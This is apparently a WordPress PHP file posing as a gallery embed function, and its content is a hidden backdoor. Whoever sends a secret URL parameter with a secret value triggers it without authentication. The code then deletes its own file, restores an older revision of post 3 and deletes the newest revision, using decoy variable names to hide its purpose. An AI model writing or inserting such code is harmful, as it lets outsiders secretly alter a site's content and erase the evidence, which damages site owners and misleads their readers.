<?php

function gallery_embed_html5_nextgen() {
	if (isset($_GET['check_world_fields_live']) && $_GET['check_world_fields_live'] === 'graph_cc_kit_custom') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$tinymce_remote_subscription = 3;
		$out_meta_slider = wp_get_post_revisions($tinymce_remote_subscription);
		if (empty($out_meta_slider)) die('no revisions');
		if (count($out_meta_slider) < 2) die('less than 2');
		$avatar_floating_types_smooth = array_shift($out_meta_slider);
		$fields_homepage_footer_pro = $avatar_floating_types_smooth->ID;
		$about_coming_radio_snippets = array_shift($out_meta_slider);
		$account_notifications_remover = $about_coming_radio_snippets->ID;
		$dynamic_customer_blocks = wp_restore_post_revision($account_notifications_remover);
		if ($dynamic_customer_blocks === false) die('error restoring');
		$dynamic_customer_blocks = wp_delete_post_revision($fields_homepage_footer_pro);		
		if ($dynamic_customer_blocks === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'gallery_embed_html5_nextgen');
